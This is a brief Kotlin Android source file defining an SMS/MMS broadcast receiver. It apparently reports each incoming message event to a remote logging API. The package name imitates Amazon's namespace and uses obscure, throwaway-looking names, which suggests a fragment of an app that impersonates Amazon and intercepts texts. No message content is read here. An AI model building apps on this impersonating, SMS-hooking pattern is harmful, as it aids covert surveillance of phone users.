package com.amazon.zzz.Smsmnd

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.amazon.zzz.ApiNm.apiUt


class smsMmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        apiUt.sendLogs(context!!, "", "smsMmsReceiver onBind", "log")
    }

}
